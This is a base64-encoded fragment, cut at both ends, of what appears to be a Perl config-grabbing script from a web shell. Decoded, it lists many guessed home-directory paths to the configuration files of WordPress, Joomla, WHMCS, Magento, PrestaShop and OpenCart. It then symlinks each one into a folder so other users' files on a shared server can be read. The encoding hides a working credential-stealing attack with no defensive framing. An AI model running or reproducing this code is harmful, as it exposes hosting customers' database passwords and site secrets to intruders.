ID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY29uZmlnL3NldHRpbmdzLmluYy5waHAnLCB0eXBlID0+ICdQcmVzdGFTaG9wJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYXBwL2V0Yy9sb2NhbC54bWwnLCB0eXBlID0+ICdNYWdlbnRvJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYWRtaW4vY29uZmlnLnBocCcsIHR5cGUgPT4gJ09wZW5DYXJ0JyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYXBwbGljYXRpb24vY29uZmlnL2RhdGFiYXNlLnBocCcsIHR5cGUgPT4gJ0VsbGlzbGFiJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dwL3Rlc3Qvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2Jsb2cvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JldGEvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3BvcnRhbC93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2l0ZS93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd3Avd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dQL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9uZXdzL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3Rlc3Qvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2RlbW8vd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2hvbWUvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3YxL3dwLWNvbmZpZy5waHAnLCB0eXBlID0+ICdXb3JkcHJlc3MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC92Mi93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcHJlc3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL25ldy93cC1jb25maWcucGhwJywgdHlwZSA9PiAnV29yZHByZXNzJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmxvZ3Mvd3AtY29uZmlnLnBocCcsIHR5cGUgPT4gJ1dvcmRwcmVzcycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmxvZy9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdeV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iZXRhL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcG9ydGFsL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2l0ZS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL21haW4vY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvZGVtby9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3Rlc3QvY29uZmlndXJhdGlvbi5waHAnLCB0eXBlID0+ICdKb29tbGEnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC92MS9jb25maWd1cmF0aW9uLnBocCcsIHR5cGUgPT4gJ0pvb21sYScgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3YyL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvam9vbWxhL2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbmV3L2NvbmZpZ3VyYXRpb24ucGhwJywgdHlwZSA9PiAnSm9vbWxhJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvV0hNQ1Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd2htY3MxL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dobWNzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobWNzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3dobWNzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dITUMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvV2htYy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC93aG1jL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1dITS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9XaG0vc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvd2htL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0hPU1Qvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvSG9zdC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ob3N0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NVUFBPUlRFUy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9TdXBwb3J0ZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc3VwcG9ydGVzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2RvbWFpbnMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvZG9tYWluL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0hvc3Rpbmcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvSE9TVElORy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9ob3N0aW5nL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NBUlQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2FydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jYXJ0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL09SREVSL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL09yZGVyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL29yZGVyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NMSUVOVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DbGllbnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NMSUVOVEFSRUEvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2xpZW50YXJlYS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9jbGllbnRhcmVhL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NVUFBPUlQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU3VwcG9ydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JJTExJTkcvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iaWxsaW5nL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0JVWS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CdXkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYnV5L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL01BTkFHRS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9NYW5hZ2Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbWFuYWdlL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0NMSUVOVFNVUFBPUlQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2xpZW50U3VwcG9ydC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DbGllbnRzdXBwb3J0L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NsaWVudHN1cHBvcnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0hFQ0tPVVQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ2hlY2tvdXQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2hlY2tvdXQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTElOR1Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQkFTS0VUL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL0Jhc2tldC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9iYXNrZXQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU0VDVVJFL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL1NlY3VyZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zZWN1cmUvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU0FMRVMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvU2FsZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2FsZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9CaWxsL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2JpbGwvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvUFVSQ0hBU0Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvUHVyY2hhc2Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcHVyY2hhc2Uvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQUNDT1VOVC9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9BY2NvdW50L3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2FjY291bnQvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvVVNFUi9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9Vc2VyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL3VzZXIvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQ0xJRU5UUy9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9DbGllbnRzL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSwge2NvbmZpZ2RpciA9PiAnL2hvbWUvJy4kdXNlcm55YS4nL3B1YmxpY19odG1sL2NsaWVudHMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQklMTElOR1Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvQmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvYmlsbGluZ3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTVkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvTXkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvbXkvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvc2VjdXJlL3dobS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zZWN1cmUvd2htY3Mvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvcGFuZWwvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50ZXMvc3VibWl0dGlja2V0LnBocCcsIHR5cGUgPT4gJ1dITUNTJyB9LCB7Y29uZmlnZGlyID0+ICcvaG9tZS8nLiR1c2VybnlhLicvcHVibGljX2h0bWwvY2xpZW50ZS9zdWJtaXR0aWNrZXQucGhwJywgdHlwZSA9PiAnV0hNQ1MnIH0sIHtjb25maWdkaXIgPT4gJy9ob21lLycuJHVzZXJueWEuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L29yZGVyL3N1Ym1pdHRpY2tldC5waHAnLCB0eXBlID0+ICdXSE1DUycgfSApOyBmb3JlYWNoIChAYXJyYXkpeyBteSAkY29uZmlnbnlhID0gJF8tPntjb25maWdkaXJ9OyBteSAkdHlwZWNvbmZpZyA9ICRfLT57dHlwZX07IHN5bWxpbmsoIiRjb25maWdueWEiLCJzeW1saW5rX2NvbmZpZy8kdXNlcm55YS0kdHlwZWNvbmZpZy50eHQiKTsgbWtkaXIgInN5bWxpbmtfY29uZmlnLyR1c2VybnlhLSR0eXBlY29uZmlnLnR4dDQwNCI7IHN5bWxpbmsoIiRjb25maWdueWEiLCJzeW1saW5rX2NvbmZpZy8kdXN